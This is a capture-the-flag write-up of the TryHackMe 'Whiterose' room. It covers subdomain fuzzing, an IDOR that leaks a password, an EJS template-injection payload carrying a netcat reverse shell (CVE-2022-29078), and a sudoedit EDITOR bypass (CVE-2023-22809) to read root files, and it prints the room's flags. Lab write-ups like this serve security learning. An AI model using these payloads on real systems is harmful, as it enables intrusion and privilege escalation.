# TryHackMe: Whiterose, EJS exploit and sudoedit bypass(CVE-2022–29078, CVE-2023–22809)

https://tryhackme.com/room/whiterose

# Enumeration

add machine ip cyprusbank.thm to /etc/hosts, unless it's not working.

```
ffuf -u http://10.10.116.234/ -H "Host:FUZZ.cyprusbank.thm" -w ~/Downloads/wordlists/subdomains-top1million-5000.txt -fw 1

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.116.234/
 :: Wordlist         : FUZZ: /home/jeon/Downloads/wordlists/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.cyprusbank.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response words: 1
________________________________________________

www                     [Status: 200, Size: 252, Words: 19, Lines: 9]
admin                   [Status: 302, Size: 28, Words: 4, Lines: 1]
:: Progress: [4989/4989] :: Job [1/1] :: 142 req/sec :: Duration: [0:00:35] :: Errors: 0 ::
```

fuzzing some possible subdomains. and found interesting subdomain. Next, access to admin.cyprusbank.thm and login with the given credential.

On message page, assume that Gayle Bev is admin, and there is a interesting parameter ?c=5. 

change it to like say ?c=10 and it reveals a secret message.
```
http://admin.cyprusbank.thm/messages/?c=10
```

##### Gayle Bev: p~]P@5!6;rs558:q


Using Burp Suite to intercept the request, modify the password parameter and observe an error message indicating that EJS files are being used.
```
Request:

POST /settings HTTP/1.1
Host: admin.cyprusbank.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: http://admin.cyprusbank.thm
Connection: keep-alive
Referer: http://admin.cyprusbank.thm/settings
Cookie: connect.sid=s%3AJOexcjMZ8sf5FRIGKw1hQqE8qcQ_Auti.H9cKb7IHVdDLa6bOzxOfYV9UlEHcVyBC6ounhAxKaXY
Upgrade-Insecure-Requests: 1
Priority: u=0, i

name=test&password1=test
```
```
Response:

ReferenceError: /home/web/app/views/settings.ejs:14
```

# CVE-2022–29078

https://security.snyk.io/vuln/SNYK-JS-EJS-2803307

ejs is a popular JavaScript templating engine.

Affected versions of this package are vulnerable to Remote Code Execution (RCE) by passing an unrestricted render option via the view options parameter of renderFile, which makes it possible to inject code into outputFunctionName. we can possibly manibpulate SSTI vulernability. So what we should do next? we are going to create reverse shell on https://www.revshells.com/ and encoding it using URL encoding. put tun0(openvpn) ip addr and put random port and there we go.
```
Payload: name=test&password1=test&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%20
2%3E%261%7Cnc%2010.17.19.196%205555%20%3E%2Ftmp%2Ff');s
```
On our terminal, we start the netcat listener: 
```
nc -lnvp 5555
Listening on 0.0.0.0 5555
Connection received on 10.10.116.234 58146
sh: 0: can't access tty; job control turned off
$ whoami
web
$ pwd
/home/web/app
$ ls
components
index.js
node_modules
package.json
package-lock.json
routes
static
views
$ cd 
$ ls
app
user.txt
$ cat user.txt
THM{4lways_upd4te_uR_d3p3nd3nc!3s}
```

# PE

$ sudo -l
Matching Defaults entries for web on cyprusbank:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm

# CVE-2023–22809

It allows us to bypass to read or edit any file by manipulating the EDITOR variable.

https://www.vicarius.io/vsociety/posts/cve-2023-22809-sudoedit-bypass-analysis

```
$ sudoedit -V
Sudo version 1.9.12p1
Sudoers policy plugin version 1.9.12p1
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.12p1
Sudoers audit plugin version 1.9.12p1
$ export EDITOR="vi -- /root/root.txt"
$ echo $EDITOR
vi -- /root/root.txt
$     sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```
```
THM{4nd_uR_p4ck4g3s}
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
"/var/tmp/rootZWkIXB0v.txt" 1L, 21C                           1,1           All
```
